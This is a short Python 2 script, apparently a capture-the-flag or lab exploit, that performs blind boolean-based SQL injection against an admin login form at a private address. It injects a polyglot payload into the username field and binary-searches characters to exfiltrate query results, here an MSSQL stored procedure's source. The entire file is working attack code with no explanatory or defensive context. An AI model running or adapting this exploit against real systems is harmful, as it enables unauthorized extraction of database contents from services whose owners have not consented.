import requests

target = '192.168.23.130:5000'

payload = '''" or 1=1# $$ or 1=1 -- ' or ascii(substring((%s),%s,1))>%s -- a'''
query = "select host_name()"

query = "select routine_definition from master.information_schema.routines where routine_name='sp_logEvent'"

s = requests.Session()

res = ''
for i in xrange(1, 100):
	l, r = 0, 128
	while l < r - 1:
		m = (l + r) / 2
		u = payload % (query, i, m)
		t = max([('Invalid password' in s.post('http://%s/admin/login/' % target, data={'username': u, 'password': 'asd'}, headers={'Content-Type': 'application/x-www-form-urlencoded'}).text) for _ in xrange(15)])
		print l, r, t, u
		if t == False:
			r = m
		else:
			l = m
	res += chr(r)
	print 'NOW', res

